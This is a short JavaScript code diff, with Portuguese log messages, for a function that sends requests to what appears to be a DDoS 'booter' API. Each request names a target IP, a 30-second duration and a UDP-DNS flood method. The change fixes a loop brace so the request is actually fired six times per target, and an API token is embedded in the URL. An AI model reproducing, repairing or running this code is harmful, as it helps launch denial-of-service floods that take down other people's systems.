@@ -15,13 +15,14 @@ let lock = false;
 async function sendApiRequest(ip) {
     for(let i = 0; i<6; i++){
        const url = `https://darlingapi.com?token=af1f1818-3541-411f-a643-db88e2c575ff&host=${ip}&port=0&time=30&method=UDP-DNS`;
-    }
+    
     try {
         await axios.get(url);
         console.log(`Requisição enviada para o IP: ${ip}`);
     } catch (error) {
         console.error(`Erro ao enviar requisição para o IP: ${ip}`, error.message);
     }
+  }
 }
 
 async function verificar() {
